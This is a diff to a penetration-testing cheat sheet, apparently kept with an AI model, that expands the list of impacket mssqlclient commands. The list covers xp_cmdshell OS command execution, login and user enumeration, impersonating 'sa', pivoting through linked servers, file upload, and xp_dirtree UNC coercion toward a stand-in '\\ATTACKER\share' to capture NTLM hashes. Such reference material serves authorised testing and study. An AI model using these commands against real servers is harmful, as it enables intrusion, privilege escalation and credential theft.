@@ -207,17 +207,42 @@ sudo impacket-smbserver share $(pwd) -smb2support
 
 ## mssqlclient Shell Commands
 
-These run directly in the mssqlclient interactive shell (not SQL):
+These run directly in the mssqlclient interactive shell (not SQL) — built-ins that automate the SQL in the sections above. Full set (impacket `mssqlshell.py`):
 
 ```
 help                    # show available commands
-enable_xp_cmdshell      # shortcut to enable xp_cmdshell
-disable_xp_cmdshell     # shortcut to disable
-xp_cmdshell <cmd>       # run OS command directly
-lcd <path>              # change local directory
-lls                     # list local directory
+-- OS command exec --
+enable_xp_cmdshell      # sp_configure toggle to turn xp_cmdshell on
+disable_xp_cmdshell     # ...and back off (OPSEC)
+xp_cmdshell <cmd>       # run OS command via xp_cmdshell
+sp_start_job <cmd>      # exec via SQL Server Agent job — alternative to xp_cmdshell
+-- recon --
+enum_logins             # server logins + sysadmin flag
+enum_users              # users in the current DB
+enum_db                 # databases (+ trustworthy flag — priv-esc tell)
+enum_owner              # DB owners
+enum_tables             # tables in current DB
+-- impersonation / priv-esc --
+enum_impersonate        # who you can EXECUTE AS (logins + users)
+exec_as_login <login>   # impersonate a server login (e.g. sa)
+exec_as_user <user>     # impersonate a DB user
+-- linked servers --
+enum_links              # linked servers + which you can auth to
+use_link <server>       # route subsequent queries through a linked server
+enable_rpc <server>     # turn on 'rpc out' so EXEC (...) AT [server] works
+disable_rpc <server>
+-- file / coercion --
+upload <local> <remote> # push a file to the target
+download <remote> <local>
+xp_dirtree <unc>        # UNC coercion → NTLM capture (\\ATTACKER\share)
+-- misc --
+shell                   # drop to a local OS shell
+lcd <path>              # change LOCAL working directory
+show_query / mask_query # echo / hide the raw SQL sent
 exit
 ```
+
+> [!tip] `use_link` + `enable_rpc` turn the manual `OPENQUERY` / `EXEC (...) AT [server]` chains in the Linked Servers section into two shell commands; `exec_as_login sa` + `enum_impersonate` do the same for the impersonation path. There is **no `lls`** command — use `shell` then `ls`, or list locally in another terminal.
 
 ---
 
@@ -234,5 +259,5 @@ exit
 ---
 
 *Created: 2026-03-06*
-*Updated: 2026-09-22*
+*Updated: 2026-09-29*
 *Model: claude-opus-4-8*
